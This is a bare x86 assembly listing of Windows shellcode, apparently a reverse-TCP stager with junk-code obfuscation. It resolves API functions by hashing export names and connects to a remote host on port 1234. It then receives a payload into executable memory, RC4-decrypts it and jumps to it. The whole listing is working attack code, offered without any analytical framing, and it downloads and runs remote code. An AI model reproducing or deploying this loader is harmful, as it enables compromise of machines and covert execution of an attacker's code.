```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    pushfd
    push eax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov edx, edx
real_1:
    pop eax
    popfd
    mov ebp, esp
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    xor edi, edi
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    push edi
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    push eax
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    mov ecx, dword ptr [eax + 0x18]
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    xor edi, edi
L_57:
    xor eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    call ebp
    mov eax, 0x190
    pushfd
    push eax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov edx, edx
real_2:
    pop eax
    popfd
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push eax
    push eax
    push eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    push 0xe0df0fea
    call ebp
    xchg edi, eax
L_c8:
    call L_d7
    xor dword ptr [edx], esi
    aaa
    xor byte ptr cs:[esi], ch
    xor byte ptr [esi], ch
    xor dword ptr [eax], eax
L_d7:
    push 0x803428a9
    call ebp
    mov eax, dword ptr [eax + 0x1c]
    push 0xa
    push eax
    push 0xd2040002
    mov esi, esp
L_eb:
    push 0x10
    push esi
    push edi
    push 0x6174a599
    call ebp
    test eax, eax
    je L_104
    dec dword ptr [esi + 8]
    jne L_eb
L_ff:
    call L_1e0
L_104:
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_15f
    mov esi, dword ptr [esi]
    xor esi, 0xd3a205a0
    lea ecx, [esi + 0x100]
    push 0x40
    push 0x1000
    push ecx
    push 0
    push 0xe553a458
    call ebp
    lea ebx, [eax + 0x100]
    push ebx
    push esi
    push eax
L_13e:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jge L_177
    pop eax
    push 0x4000
    push 0
    push eax
    push 0x300f2f0b
    call ebp
L_15f:
    push edi
    push 0x614d6e75
    call ebp
    pop esi
    pop esi
    dec dword ptr [esp]
    jne L_c8
    jmp L_ff
L_177:
    add ebx, eax
    sub esi, eax
    jne L_13e
    pop ebx
    pop ecx
    pop ebp
    push ebp
    push edi
    mov edi, ebx
    call L_199
    xor al, 0x2a
    push 0x53d0a27e
    pushal
    leave
    push ebx
    adc byte ptr [edx - 0x35], bh
    .byte 0xE8, 0x3E, 0x08
L_199:
    .byte 0x5E, 0x31
    shr byte ptr [edx - 0x48a3f02], 0x81
    out dx, eax
    add byte ptr [ecx], al
    add byte ptr [eax], al
    xor ebx, ebx
L_1a9:
    add bl, byte ptr [edi + eax]
    mov edx, eax
    and dl, 0xf
    add bl, byte ptr [esi + edx]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    inc al
    jne L_1a9
    xor ebx, ebx
L_1c3:
    inc al
    add bl, byte ptr [edi + eax]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    add dl, byte ptr [edi + ebx]
    mov dl, byte ptr [edi + edx]
    xor byte ptr [ebp], dl
    inc ebp
    dec ecx
    jne L_1c3
    pop edi
    ret
L_1e0:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```